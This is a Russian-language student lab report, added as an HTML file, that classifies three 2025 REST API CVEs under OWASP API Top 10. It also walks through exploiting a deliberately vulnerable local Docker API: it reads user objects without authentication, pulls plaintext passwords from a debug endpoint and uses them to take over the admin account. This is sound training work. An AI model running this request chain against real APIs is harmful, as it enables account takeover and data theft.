@@ -1,0 +1,244 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ЛР3</title>
+  <link rel="stylesheet" href="https://stackedit.io/style.css" />
+</head>
+
+<body class="stackedit">
+  <div class="stackedit__html"><h1 id="лабораторная-работа-№3">Лабораторная работа №3</h1>
+<h2 id="часть-i-—-анализ-cve-относящихся-к-owasp-api-top-10-rest-api">Часть I — Анализ CVE, относящихся к OWASP API Top 10 (REST API)</h2>
+<hr>
+<h2 id="цель-работы">Цель работы</h2>
+<p>Найти 3 CVE за последний год, относящиеся к уязвимостям REST API из OWASP API Top 10, описать их суть, причины возникновения и классифицировать по категориям OWASP.</p>
+<hr>
+<h2 id="cve-2025-63783-—-broken-object-level-authorization-bola">CVE-2025-63783 — Broken Object Level Authorization (BOLA)</h2>
+<h3 id="описание">Описание</h3>
+<p>Уязвимость обнаружена в REST API приложения Onlook (tRPC mutation endpoints).<br>
+Атакующий может изменить параметр <code>project_id</code> в запросе и получить доступ к объектам других пользователей (просмотр, изменение, удаление).</p>
+<h3 id="суть-уязвимости">Суть уязвимости</h3>
+<p>REST API не выполняет проверку принадлежности объекта пользователю.<br>
+Доступ к ресурсу определяется только по идентификатору объекта без проверки прав доступа.</p>
+<h3 id="причины-возникновения">Причины возникновения</h3>
+<ul>
+<li>Отсутствие проверки авторизации на уровне объекта</li>
+<li>Доверие пользовательскому вводу (<code>project_id</code>)</li>
+<li>Отсутствие централизованного механизма контроля доступа</li>
+</ul>
+<h3 id="owasp-api-top-10">OWASP API Top 10</h3>
+<ul>
+<li>API1: Broken Object Level Authorization (BOLA)</li>
+</ul>
+<h3 id="последствия">Последствия</h3>
+<ul>
+<li>Доступ к чужим данным</li>
+<li>Возможность изменения или удаления ресурсов других пользователей</li>
+<li>Нарушение конфиденциальности данных</li>
+</ul>
+<hr>
+<h2 id="cve-2025-27505-—-broken-authentication--security-misconfiguration">CVE-2025-27505 — Broken Authentication / Security Misconfiguration</h2>
+<h3 id="описание-1">Описание</h3>
+<p>В GeoServer REST API обнаружена ошибка конфигурации безопасности.<br>
+Атакующий может получить доступ к REST API без аутентификации, используя обход маршрутов (например <code>/rest.html</code>).</p>
+<h3 id="суть-уязвимости-1">Суть уязвимости</h3>
+<p>REST API защищён неполностью, что позволяет обходить механизмы аутентификации через альтернативные URL.</p>
+<h3 id="причины-возникновения-1">Причины возникновения</h3>
+<ul>
+<li>Неполная защита REST маршрутов</li>
+<li>Ошибки в security filters</li>
+<li>Некорректная обработка URL-паттернов</li>
+</ul>
+<h3 id="owasp-api-top-10-1">OWASP API Top 10</h3>
+<ul>
+<li>API2: Broken Authentication</li>
+<li>API7: Security Misconfiguration</li>
+</ul>
+<h3 id="последствия-1">Последствия</h3>
+<ul>
+<li>Доступ к API без авторизации</li>
+<li>Возможность разведки системы</li>
+<li>Потенциальная утечка данных</li>
+</ul>
+<hr>
+<h2 id="cve-2025-55210-—-broken-authentication--broken-function-level-authorization">CVE-2025-55210 — Broken Authentication + Broken Function Level Authorization</h2>
+<h3 id="описание-2">Описание</h3>
+<p>В FreePBX API модуле обнаружена уязвимость, позволяющая подделывать JWT токены и получать доступ к REST/GraphQL API с повышенными привилегиями.</p>
+<h3 id="суть-уязвимости-2">Суть уязвимости</h3>
+<p>Система некорректно проверяет JWT токены, что позволяет использовать поддельные или модифицированные токены для доступа к защищённым функциям API.</p>
+<h3 id="причины-возникновения-2">Причины возникновения</h3>
+<ul>
+<li>Некорректная валидация JWT подписи</li>
+<li>Отсутствие проверки roles/scopes</li>
+<li>Слабая реализация механизма авторизации</li>
+</ul>
+<h3 id="owasp-api-top-10-2">OWASP API Top 10</h3>
+<ul>
+<li>API2: Broken Authentication</li>
+<li>API5: Broken Function Level Authorization</li>
+</ul>
+<h3 id="последствия-2">Последствия</h3>
+<ul>
+<li>Эскалация привилегий</li>
+<li>Доступ к административным функциям API</li>
+<li>Полный контроль над частью системы</li>
+</ul>
+<hr>
+<h2 id="итог">Итог</h2>
+<p>Рассмотренные уязвимости относятся к следующим категориям OWASP API Top 10:</p>
+<ul>
+<li>Broken Object Level Authorization (BOLA)</li>
+<li>Broken Authentication</li>
+<li>Security Misconfiguration</li>
+<li>Broken Function Level Authorization</li>
+</ul>
+<hr>
+<h2 id="вывод">Вывод</h2>
+<p>Основные причины уязвимостей REST API:</p>
+<ul>
+<li>отсутствие проверки прав доступа на уровне объектов</li>
+<li>ошибки конфигурации маршрутов API</li>
+<li>некорректная реализация JWT и механизмов авторизации</li>
+</ul>
+<hr>
+<h2 id="формат-отчёта">Формат отчёта</h2>
+<p>Данный документ подготовлен в формате Markdown и может быть конвертирован в HTML с использованием открытых инструментов (например Pandoc, markdown-it, Python markdown-парсеры).</p>
+<h1 id="часть-ii-—-анализ-уязвимостей-rest-api">Часть II — Анализ уязвимостей REST API</h1>
+<hr>
+<h2 id="цель-работы-1">Цель работы</h2>
+<p>Провести анализ уязвимого REST API приложения, выявить уязвимости, соответствующие OWASP API Top 10, и продемонстрировать их эксплуатацию.</p>
+<hr>
+<h2 id="ход-работы">Ход работы</h2>
+<p>Был развернут уязвимый Docker-контейнер:</p>
+<p>docker pull ket9/otus-devsecops-owasp-rest<br>
+docker run -d -p 8080:8080 ket9/otus-devsecops-owasp-rest:latest</p>
+<p>После запуска приложение стало доступно по адресу:</p>
+<p><a href="http://localhost:8080/">http://localhost:8080/</a></p>
+<p>Инициализация базы данных была выполнена через:</p>
+<p><a href="http://localhost:8080/createdb">http://localhost:8080/createdb</a></p>
+<hr>
+<h2 id="анализ-rest-api">Анализ REST API</h2>
+<p>В ходе исследования были обнаружены следующие эндпоинты:</p>
+<ul>
+<li>GET /users/v1 — получение списка пользователей</li>
+<li>GET /users/v1/{username} — получение информации о пользователе</li>
+<li>GET /users/v1/_debug — получение расширенной информации</li>
+<li>POST /users/v1/login — аутентификация пользователя</li>
+</ul>
+<hr>
+<h2 id="уязвимость-№1-—-broken-object-level-authorization-bola">Уязвимость №1 — Broken Object Level Authorization (BOLA)</h2>
+<h3 id="описание-3">Описание</h3>
+<p>Обнаружена возможность получения данных пользователей без прохождения аутентификации.</p>
+<h3 id="эксплуатация">Эксплуатация</h3>
+<p>GET /users/v1/admin<br>
+GET /users/v1/name1</p>
+<p>Ответ сервера:</p>
+<p>{<br>
+“username”: “admin”,<br>
+“email”: <a href="mailto:%22admin@mail.com">"admin@mail.com</a>"<br>
+}</p>
+<hr>
+<h3 id="суть-проблемы">Суть проблемы</h3>
+<p>Отсутствует проверка прав доступа к объектам. Доступ к данным определяется исключительно значением параметра username, без проверки прав пользователя.</p>
+<h3 id="классификация-owasp">Классификация OWASP</h3>
+<p>API1: Broken Object Level Authorization (BOLA)</p>
+<hr>
+<h2 id="уязвимость-№2-—-excessive-data-exposure">Уязвимость №2 — Excessive Data Exposure</h2>
+<h3 id="описание-4">Описание</h3>
+<p>Выявлен debug endpoint, возвращающий избыточные и чувствительные данные пользователей.</p>
+<h3 id="эксплуатация-1">Эксплуатация</h3>
+<p>GET /users/v1/_debug</p>
+<p>Ответ сервера:</p>
+<p>{<br>
+“users”: [<br>
+{<br>
+“username”: “name1”,<br>
+“email”: <a href="mailto:%22mail1@mail.com">"mail1@mail.com</a>",<br>
+“password”: “pass1”,<br>
+“admin”: false<br>
+},<br>
+{<br>
+“username”: “name2”,<br>
+“email”: <a href="mailto:%22mail2@mail.com">"mail2@mail.com</a>",<br>
+“password”: “pass2”,<br>
+“admin”: false<br>
+},<br>
+{<br>
+“username”: “admin”,<br>
+“email”: <a href="mailto:%22admin@mail.com">"admin@mail.com</a>",<br>
+“password”: “pass1”,<br>
+“admin”: true<br>
+}<br>
+]<br>
+}</p>
+<hr>
+<h3 id="суть-проблемы-1">Суть проблемы</h3>
+<p>API возвращает данные, не предназначенные для внешнего доступа, включая пароли и информацию о правах пользователей.</p>
+<h3 id="классификация-owasp-1">Классификация OWASP</h3>
+<p>API3: Excessive Data Exposure</p>
+<hr>
+<h2 id="уязвимость-№3-—-broken-authentication-цепочка-атаки">Уязвимость №3 — Broken Authentication (цепочка атаки)</h2>
+<h3 id="описание-5">Описание</h3>
+<p>Использование данных, полученных через debug endpoint, позволяет выполнить аутентификацию и изменить данные администратора.</p>
+<h3 id="эксплуатация-2">Эксплуатация</h3>
+<ol>
+<li>Получение учетных данных:</li>
+</ol>
+<p>GET /users/v1/_debug<br>
+Пароль администратора: pass1</p>
+<ol start="2">
+<li>Аутентификация:</li>
+</ol>
+<p>POST /users/v1/login<br>
+{<br>
+“username”: “admin”,<br>
+“password”: “pass1”<br>
+}</p>
+<p>Получен auth_token.</p>
+<ol start="3">
+<li>Изменение данных:</li>
+</ol>
+<p>PUT /users/v1/admin/email<br>
+Authorization: Bearer TOKEN</p>
+<p>{<br>
+“email”: <a href="mailto:%22hacked@mail.com">"hacked@mail.com</a>"<br>
+}</p>
+<ol start="4">
+<li>Результат:</li>
+</ol>
+<p>{<br>
+“username”: “admin”,<br>
+“email”: <a href="mailto:%22hacked@mail.com">"hacked@mail.com</a>"<br>
+}</p>
+<hr>
+<h3 id="суть-проблемы-2">Суть проблемы</h3>
+<p>Отсутствует защита от использования скомпрометированных учетных данных и недостаточная проверка авторизации при изменении данных.</p>
+<h3 id="классификация-owasp-2">Классификация OWASP</h3>
+<p>API2: Broken Authentication</p>
+<hr>
+<h2 id="общие-выводы">Общие выводы</h2>
+<p>В ходе работы выявлены следующие уязвимости:</p>
+<ul>
+<li>Broken Object Level Authorization (BOLA)</li>
+<li>Excessive Data Exposure</li>
+<li>Broken Authentication</li>
+</ul>
+<hr>
+<h2 id="меры-защиты">Меры защиты</h2>
+<ul>
+<li>реализация строгой проверки авторизации на уровне объектов</li>
+<li>исключение возврата чувствительных данных</li>
+<li>отключение debug-эндпоинтов в production</li>
+<li>хранение паролей в виде хешей</li>
+<li>использование RBAC/ABAC</li>
+<li>проверка прав доступа при всех изменяющих операциях</li>
+</ul>
+<hr>
+<h2 id="заключение">Заключение</h2>
+<p>В процессе анализа REST API были выявлены критические уязвимости, позволяющие осуществлять несанкционированный доступ к данным пользователей и их модификацию при наличии скомпрометированных учетных данных.</p>
+</div>
+</body>
+
+</html>
